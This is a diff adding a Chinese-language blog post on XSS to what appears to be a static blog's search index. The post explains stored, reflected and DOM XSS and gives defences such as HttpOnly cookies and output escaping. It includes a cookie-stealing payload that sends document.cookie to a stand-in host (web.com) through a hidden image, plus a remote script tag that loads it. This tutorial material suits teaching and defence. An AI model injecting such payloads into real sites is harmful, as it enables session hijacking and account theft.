@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>web安全</title>
+      <link href="/2020/06/04/web%E5%AE%89%E5%85%A8/"/>
+      <url>/2020/06/04/web%E5%AE%89%E5%85%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="常见的web安全问题"><a href="#常见的web安全问题" class="headerlink" title="常见的web安全问题"></a>常见的web安全问题</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="存储性XSS"><a href="#存储性XSS" class="headerlink" title="存储性XSS"></a>存储性XSS</h3><p>利用别人的cookie，可以冒充真实的用户，在颁发cookie的那个网站中为所欲为。<br>因为浏览器的同源策略，所以不能获取到其他网站的cookie，但通过把JavaScript代码注入到目标页面中，就能绕过同源策略，比如在HTML的[<input>]中注入JavaScript代码，等到数据提交到服务器端，会保存下来，下次展示页面的时候，就会执行这段代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&apos;text/javascript&apos;&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>等到再次有人访问这个页面的时候，就可以把那个人的cookie显示出来了！<br>当然不能直接把用户的cookie直接alert出来，而同源策略严格限制了JavaScript的跨域访问，但同源策略并不限制[<img>]这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的[<img>]，通过这个[<img>]发cookie到自己的服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img=document.createElement(&quot;img&quot;);</span><br><span class="line">img.src=&quot;http://web.com/log?&quot;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>只要这段代码被执行，用户的cookie就会发送到别人的服务器上(“<a href="http://web.com/log&quot;)。再将这段代码封装成一个js文件(web.js)" target="_blank" rel="noopener">http://web.com/log&quot;)。再将这段代码封装成一个js文件(web.js)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&apos;text/javascript&apos; src=&quot;http://web.com/web.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这样就可以拿到用户的cookie了。</p><p>防范措施：<br>在网站的Cookie加上HttpOnly属性：<br>Set-Cookie: JSESSIONID=xxxxxx;Path=/;Domain=book.com;HttpOnly<br>这样浏览器就禁止JavaScript的读取了。<br>当然通过页面注入JavaScript代码，那就可以不只是借Cookie了。例如可以用这个JS代码画一个假的登录框，覆盖到真的登录框之上，让用户信以为真，这样就可以偷到真实的用户名和密码了。或者通过JavaScript构造GET,POST请求，可以模拟用户在该网站做点手脚，删点什么东西，从一个账户往另一个账户转账，都是可以的。<br>将用户输入的特殊字符例如&lt;,&gt;过滤掉，这样[<script>]可能会变成['script']被存到数据库里。<br>另一方面还可以对输出进行编码/转义操作，例如把<变成[&lt;]，把>变成[&gt;]，浏览器收到以后，就会认为是数据，把[<script>]作为字符串给显示出来，而不是执行后面的代码！</p><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><p>黑客先将含有XSS代码的恶意链接邮件发送给目标用户，用户打开后，会访问链接对应的服务器，服务器收到链接请求时，会将带有的XSS代码的数据再次发送给用户，此时用户浏览器就会默认执行带有XSS代码的脚本，此时会触发XSS漏洞，不过在这个过程中，黑客先确认发给某个服务器，服务器会给黑客返回发送的数据。</p><h3 id="DOM性XSS"><a href="#DOM性XSS" class="headerlink" title="DOM性XSS"></a>DOM性XSS</h3><p>1.服务端返回的数据与正常网页相同<br>2.产生点在与对dom节点的操作</p></script></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 前端 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>js-设计模式</title>
       <link href="/2020/05/07/js-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
       <url>/2020/05/07/js-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
